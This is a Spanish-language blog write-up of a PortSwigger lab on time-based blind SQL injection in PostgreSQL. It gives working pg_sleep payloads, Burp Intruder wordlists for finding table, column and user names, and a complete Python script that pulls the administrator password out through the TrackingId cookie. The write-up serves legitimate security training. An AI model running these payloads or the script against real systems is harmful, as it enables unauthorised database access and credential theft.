---
title: "14 Blind SQL injection with time delays and information retrieval"
collection: publications
category: portswigger
permalink: /publications/14_Blind SQL injection with time delays and information retrieval
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. Para resolver el laboratorio, explotamos la vulnerabilidad de inyección SQL basada en el tiempo y obtenemos la contraseña del usuario administrador.'
date: 2024-12-02
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'Blind SQL injection with time delays and information retrieval'
---

![logo]({{site.url}}/images/SQLi/sqli-14/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/SQLi/sqli-14/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, inicia sesión como usuario `administrator`.

## Analisis del campo vulnerable

En esta ocación vamos a probar el `TrackingId` si es vulnerable a Blind SQLi basado en tiempo. Necesitamos averiguar que Motor de BD es. Y vemos que es un `PostgreSQL`

![Cheat]({{site.url}}/images/SQLi/sqli-13/cheat.png)

```sql
' || (SELECT pg_sleep(10))--                                -> Payload para BD PostgreSQL   ✅
' || (SELECT sleep(10))--                                   -> Payload para BD MySQL   ❌
' || (SELECT dbms_pipe.receive_message(('a'), 10))--        -> Payload para BD Oracle   ❌
' || WAITFOR DELAY '0:0:10'--                               -> Payload para BD SQL Server   ❌
```

![Tiempo]({{site.url}}/images/SQLi/sqli-14/tiempo.png)

## Comprobamos nombres de tablas

Donde se encuentra la palabra `payload` colocamos nombres de tablas, si existe se demora 5 segundos en responde en caso contrario demora menos.

```sql
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(2) END FROM payload)--
```

```text
products
items
inventory
orders
order_items
sales
transactions
pricing
categories
customers
clients
users
profiles
subscriptions
addresses
```

![Intruder]({{site.url}}/images/SQLi/sqli-14/intruder.png)

Realizamos la carga de payloads y tener en cuenta cambiar el `Resource Pool` a 1

![Pool]({{site.url}}/images/SQLi/sqli-14/pool.png)

La tabla que se demoro mas en responder fue la de users.

![Respuesta]({{site.url}}/images/SQLi/sqli-14/respuesta.png)

## Comprobamos nombres de los campos que tiene la tabla users

Donde se encuentra `payload` realizar el ataque de diccionario con BurpSuite

```sql
' || (SELECT CASE WHEN (EXISTS(SELECT 1 FROM information_schema.columns WHERE table_name='users' AND column_name='payload')) THEN pg_sleep(10) ELSE pg_sleep(2) END)--
```

Lista de nombres para listar columnas de una tabla.
```list
id
user_id
username
email
phone_number
uuid
password
hashed_password
salt
token
last_login
login_attempts
first_name
last_name
full_name
date_of_birth
gender
address
city
state
country
postal_code
role
role_id
permissions
is_admin
is_active
```

Realizamos un ataque y analizar el estado de la respuesta, si es un estado 200 ok, es valido sino no existe la columna dentro de la tabla.

![Intruder 2]({{site.url}}/images/SQLi/sqli-14/intruder2.png)

Realizamos la carga de payloads y tener en cuenta cambiar el `Resource Pool` a 1

![Pool]({{site.url}}/images/SQLi/sqli-14/pool.png)

La tabla que se demoro mas en responder fue la de `email, username, password`.

![Respuesta]({{site.url}}/images/SQLi/sqli-14/respuesta2.png)

## Averiguar nombre de usuarios en la BD

Ya que tenemos el nombre de la tabla y sus campos vamos a listar el nombre de los usuarios. TODO usuario que genere error existe en la tabla.

```sql
' || (SELECT CASE WHEN (username='payload') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
```

Lista de nombre de usuarios mas comunes

 ```
admin
administrator
root
user
guest
test
superuser
default
manager
support
moderator
developer
operator
owner
sales
marketing
finance
hr
accounting
itadmin
 ```

 Realizamos el ataque de intruder, tener presente colocar `Resouce Pool` en 1 para que realice el ataque 1 por 1.

![Intruder 3]({{site.url}}/images/SQLi/sqli-14/intruder3.png)

Filtramos por `Response received` mas alta, ya que es la que se demora más.

![Respuesta 3]({{site.url}}/images/SQLi/sqli-14/respuesta3.png)

## Averiguar longitud de password

El payload es tipo `entero`, ya que vamos a averiguar cuantos caracteres tiene el password de un usuario. tener presente colocar `Resouce Pool` en 1 para que realice el ataque 1 por 1.

```sql
' || (select case when (username='administrator' and LENGTH(password)>payload) then pg_sleep(10) else pg_sleep(-1) end from users)--
```

![Intruder 4]({{site.url}}/images/SQLi/sqli-14/intruder4.png)

La longitud de la contraseña de `administrator` es de 20 caracteres.

![Respuesta 4]({{site.url}}/images/SQLi/sqli-14/respuesta4.png)

## Ataque de Fuerza Bruta al campo Password

Utiliza una consulta que verifique si un carácter en una posición específica coincide con una letra. Si demora en responder, la consulta la letra pertenece al password.

```sql
' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--
```

Realizamos la consulta desde el `Intruder` para enumerar los caracteres. NO olvidar `url encode` la url

![Intruder 5]({{site.url}}/images/SQLi/sqli-14/intruder5.png)

Filtramos por las que más se demoran en responder

![Respuesta 5]({{site.url}}/images/SQLi/sqli-14/respuesta5.png)

## Login

![Login]({{site.url}}/images/SQLi/sqli-14/login.png)

## Aprobado

![Aprobado]({{site.url}}/images/SQLi/sqli-14/aprobado.png)

# Codigo Python

```sql
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sql_payload = "' || (select case when (username='administrator' and ascii(substring(password,%s,1))='%s') then pg_sleep(10) else pg_sleep(-1) end from users)--" %(i,j)
            sql_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {'TrackingId': '4kvqBxnpvcbcGVXk' + sql_payload_encoded, 'session': 'EI9T2L5PowgzjIUPcILvNp7IoJPvjvPN'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if int(r.elapsed.total_seconds()) > 9:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retreiving administrator password...")
    sqli_password(url) 

if __name__ == "__main__":
    main()
```